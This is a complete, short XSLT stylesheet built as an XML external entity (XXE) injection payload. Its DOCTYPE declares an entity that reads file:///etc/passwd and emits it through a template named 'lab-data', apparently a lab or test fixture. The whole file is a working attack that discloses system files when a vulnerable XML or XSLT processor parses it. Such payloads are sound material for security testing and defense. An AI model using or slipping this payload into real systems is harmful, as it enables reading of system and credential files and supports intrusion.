<!DOCTYPE xsl:stylesheet [
  <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template name="lab-data"><xsl:text>&f;</xsl:text></xsl:template>
</xsl:stylesheet>
